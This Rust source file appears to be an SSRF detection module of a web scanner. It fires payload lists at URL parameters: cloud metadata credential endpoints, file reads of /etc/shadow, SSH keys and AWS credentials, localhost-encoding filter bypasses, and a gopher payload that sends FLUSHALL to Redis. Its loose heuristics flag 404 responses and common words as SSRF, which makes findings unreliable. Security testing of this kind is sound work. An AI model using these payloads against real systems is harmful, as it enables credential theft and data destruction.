//! SSRF detection — cloud metadata, protocol-level, body probes, OOB callbacks.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use url::Url;

const SSRF_PARAMS: &[&str] = &[
    "url",
    "uri",
    "path",
    "file",
    "redirect",
    "return",
    "page",
    "load",
    "read",
    "img",
    "image",
    "src",
    "href",
    "data",
    "target",
    "endpoint",
    "api",
    "callback",
    "next",
    "prev",
    "dest",
    "destination",
    "continue",
    "out",
    "view",
    "dir",
    "show",
    "document",
    "feed",
    "source",
    "ajax",
    "fetch",
    "get",
    "post",
    "location",
    "forward",
    "proxy",
    "download",
    "upload",
    "link",
    "domain",
    "u",
    "q",
    "query",
    "site",
    "surl",
    "rurl",
    "redirect_url",
    "redirect_uri",
    "callback_url",
    "cb",
    "host",
    "hostname",
    "ip",
    "addr",
    "address",
    "server",
    "remote",
    "remote_url",
    "goto",
    "go",
    "jump",
    "next_url",
    "postback",
    "notify_url",
    "webhook",
    "webhook_url",
    "download_url",
    "attachment",
    "media",
    "avatar",
    "logo",
    "icon",
    "cover",
    "thumb",
    "thumbnail",
    "preview",
    "cdn",
    "static",
    "asset",
    "resource",
    "base_url",
    "referer",
    "origin",
    "return_url",
    "returnUrl",
    "port",
    "proxy_url",
    "route",
    "render_url",
    "template_url",
    "script_url",
    "jsonp",
    "jsonp_callback",
    "output",
    "push_url",
    "sync_url",
    "cache_url",
    "full_url",
    "filepath",
    "filename",
    "f",
    "fn",
];

const SSRF_METADATA: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/user-data/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    "http://169.254.169.254/openstack/latest/meta_data.json",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/self/cwd",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://localhost:11211/",
    "gopher://redis:6379/_SET%20test%20x",
    "ftp://127.0.0.1:21",
    "ldap://127.0.0.1:389",
    "smb://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/meta-data/placement/availability-zone",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/mac",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    "http://169.254.169.254/latest/meta-data/ami-manifest-path",
    "http://metadata.google.internal/computeMetadata/v1/instance/id",
    "http://metadata.google.internal/computeMetadata/v1/instance/name",
    "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
    "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
    "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
    "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/instance-id",
    "http://100.100.100.200/latest/meta-data/region-id",
    "http://100.100.100.200/latest/meta-data/zone-id",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    "http://100.100.100.200/latest/meta-data/vpc-id",
    "http://100.100.100.200/latest/meta-data/instance/name",
    "http://100.100.100.200/latest/meta-data/private-ipv4",
    "http://100.100.100.200/latest/meta-data/mac",
    "http://metadata.tencentyun.com/latest/meta-data/instance-id",
    "http://metadata.tencentyun.com/latest/meta-data/placement/region",
    "http://metadata.tencentyun.com/latest/meta-data/placement/zone",
    "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/",
    "http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/",
    "http://metadata.tencentyun.com/latest/meta-data/uuid",
    "http://metadata.tencentyun.com/latest/meta-data/local-ipv4",
    "http://metadata.tencentyun.com/latest/meta-data/public-ipv4",
    "http://169.254.169.254/metadata/v1/id",
    "http://169.254.169.254/metadata/v1/user-data",
    "http://169.254.169.254/metadata/v1/hostname",
    "http://169.254.169.254/metadata/v1/region",
    "http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address",
    "http://169.254.169.254/opc/v2/instance/",
    "http://169.254.169.254/opc/v2/instance/metadata",
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/openstack/latest/user_data",
    "http://169.254.169.254/openstack/2018-08-27/meta_data.json",
    "http://169.254.169.254/openstack/latest/network_data.json",
    "https://kubernetes.default.svc/api/v1/namespaces/default/pods",
    "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
    "http://127.0.0.1:10250/pods",
    "http://127.0.0.1:6443/version",
    "http://127.0.0.1:8001/api",
    "http://127.0.0.1:2379/version",
    "http://127.0.0.1:4001/version",
    "http://127.0.0.1:2375/containers/json",
    "http://127.0.0.1:2375/version",
    "http://127.0.0.1:4243/containers/json",
    "http://127.0.0.1:8500/v1/agent/self",
    "http://127.0.0.1:8500/v1/catalog/services",
    "http://127.0.0.1:8200/v1/auth/token/lookup-self",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:9200/_cat/indices",
    "http://127.0.0.1:9200/_nodes",
    "http://127.0.0.1:9200/_cluster/health",
    "http://127.0.0.1:15672/api/overview",
    "http://127.0.0.1:5984/",
    "http://127.0.0.1:7474/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:5432/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:27017/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:25/",
    "http://127.0.0.1:9090/api/v1/status/config",
    "http://127.0.0.1:9100/metrics",
    "http://127.0.0.1:19999/api/v1/info",
    "http://127.0.0.1:8086/ping",
    "http://127.0.0.1:8888/",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:11211/version",
    "gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20grym%20x%0d%0aQUIT%0d%0a",
    "gopher://127.0.0.1:11211/_version",
    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a",
    "gopher://127.0.0.1:25/_HELO%20x",
    "telnet://127.0.0.1:25/",
    "redis://127.0.0.1:6379/info",
    "mongodb://127.0.0.1:27017/",
    "file:///etc/shadow",
    "file:///etc/hostname",
    "file:///etc/hosts",
    "file:///proc/self/status",
    "file:///proc/net/tcp",
    "file:///proc/version",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "file:///c:/boot.ini",
    "file:///c:/inetpub/wwwroot/web.config",
    "file:///var/www/html/index.php",
    "file:///var/www/html/.env",
    "file:///app/.env",
    "file:///root/.ssh/id_rsa",
    "file:///root/.aws/credentials",
    "file:///home/ubuntu/.aws/credentials",
    "file:///etc/kubernetes/kubelet.conf",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
    "file:///tmp/.dockerenv",
    "file:///etc/nginx/nginx.conf",
    "file:///etc/apache2/apache2.conf",
    "file:///etc/mysql/my.cnf",
    "file:///etc/ssh/sshd_config",
    "file:///var/lib/mysql/auto.cnf",
];

/// Hostname/encoding variants used to bypass SSRF filters (localhost aliases,
/// decimal/hex IPs, DNS-pinning tricks).
const SSRF_BYPASS_HOSTS: &[&str] = &[
    "http://localhost/",
    "http://localhost:80/",
    "http://127.0.0.1/",
    "http://127.0.0.1:8080/",
    "http://127.1/",
    "http://0/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://0177.0.0.1/",
    "http://0x7f000001/",
    "http://0x7f.0.0.1/",
    "http://2130706433/",
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",
    "http://lvh.me/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:27017/",
];

const CLOUD_PROVIDER_DETECTION: &[(&str, &str)] = &[
    ("169.254.169.254", "AWS Metadata Endpoint"),
    ("metadata.google.internal", "GCP Metadata Endpoint"),
    ("100.100.100.200", "Alibaba/Cloud Metadata Endpoint"),
    ("169.254.169.254/metadata", "Azure Metadata Endpoint"),
    ("metadata.tencentyun.com", "Tencent Cloud Metadata Endpoint"),
];

/// Checks if response body suggests cloud metadata reflection.
fn has_metadata_indicator(body: &str, _target: &str) -> bool {
    let body_lower = body.to_lowercase();
    if body_lower.contains("ami-id")
        || body_lower.contains("instance-id")
        || body_lower.contains("security-credentials")
        || body_lower.contains("accesskeyid")
        || body_lower.contains("secretaccesskey")
        || body_lower.contains("region")
        || body_lower.contains("availability-zone")
        || body_lower.contains("gcp")
        || body_lower.contains("project")
        || body_lower.contains("accesskey")
        || body_lower.contains("secret")
        || body_lower.contains("akia")
        || body_lower.contains("private key")
        || body_lower.contains("ssh-rsa")
        || body_lower.contains("client_id")
        || body_lower.contains("subscription")
        || body_lower.contains("dockerenv")
        || body_lower.contains("kubelet")
        || body_lower.contains("x509")
        || body_lower.contains("instance-type")
        || body_lower.contains("placement")
    {
        return true;
    }

    // Check for protocol-level responses
    if body_lower.contains("httpd")
        || body_lower.contains("root:")
        || body_lower.contains("daemon:")
        || body_lower.contains("uid=")
        || body_lower.contains("HOME=")
        || body_lower.contains("PATH=")
    {
        return true;
    }

    // Check for SMTP/Redis/LDAP banner responses
    let short_body = body_lower.chars().take(200).collect::<String>();
    if short_body.contains("+ok")
        || short_body.contains("banner")
        || short_body.contains("220 ")
        || short_body.contains("redis_version")
    {
        return true;
    }

    false
}

pub async fn check_ssrf(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();

    for (param_name, _value) in &base_query {
        let param_lower = param_name.to_lowercase();
        if !SSRF_PARAMS.contains(&param_lower.as_str()) {
            continue;
        }

        for target in SSRF_METADATA.iter().chain(SSRF_BYPASS_HOSTS) {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &base_query {
                    let val = if k == param_name {
                        target.to_string()
                    } else {
                        v.clone()
                    };
                    pairs.append_pair(k, &val);
                }
            }

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
            {
                let is_metadata = has_metadata_indicator(&response.body, target);
                let notable_status =
                    response.status == 200 || response.status == 404 || response.status == 502;

                if is_metadata || notable_status {
                    let is_cloud = CLOUD_PROVIDER_DETECTION
                        .iter()
                        .any(|(ip, _)| target.contains(ip));

                    // Determine confidence based on evidence
                    let confidence = if is_metadata {
                        Confidence::Confirmed
                    } else if notable_status {
                        Confidence::Possible
                    } else {
                        Confidence::Possible
                    };

                    let severity = if is_cloud {
                        Severity::Critical
                    } else {
                        Severity::High
                    };

                    let mut f = Finding::new(
                        format!(
                            "SSRF detected — '{}' parameter with '{}' endpoint",
                            param_name, target
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        severity,
                        confidence,
                        "grym-web-scanner",
                    );
                    f.categories.push("A01:2025-Broken-Access-Control".into());
                    f.cwe_ids.push(918);

                    let evidence_detail = if is_metadata {
                        format!(
                            "SSRF confirmed: metadata/service content returned from {}",
                            target
                        )
                    } else {
                        format!(
                            "SSRF probe triggered: {} returned HTTP {}",
                            target, response.status
                        )
                    };

                    f.evidence.push(Evidence::redacted(
                        "ssrf",
                        evidence_detail,
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation =
                        "Restrict outbound HTTP requests from backend servers. Use an allowlist \
                        of permitted URLs and validate all user-supplied URL parameters."
                            .into();
                    f.references.push(
                        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
                            .into(),
                    );
                    findings.push(f);
                    break;
                }
            }
        }
    }

    // Phase 2: Check for base URL response cloud metadata
    if findings.is_empty() {
        let probes = ["/", "/latest/meta-data/", "/health", "/status"];
        for probe in probes {
            if let Ok(base_url) = url.join(probe)
                && let Ok(response) = client
                    .get("grym-web-scanner", base_url, TechniqueTier::SafeActive)
                    .await
                && has_metadata_indicator(&response.body, probe)
            {
                let mut f = Finding::new(
                    format!("SSRF via URL path '{}' — metadata reflected", probe),
                    AssetRef {
                        identifier: url.to_string(),
                        kind: "web".into(),
                    },
                    Severity::Critical,
                    Confidence::Confirmed,
                    "grym-web-scanner",
                );
                f.categories.push("A01:2025-Broken-Access-Control".into());
                f.cwe_ids.push(918);
                f.evidence.push(Evidence::redacted(
                    "ssrf-path",
                    format!("Probe '{}' returned metadata content", probe),
                    response.body.chars().take(200).collect::<String>(),
                ));
                findings.push(f);
                break;
            }
        }
    }

    Ok(findings)
}
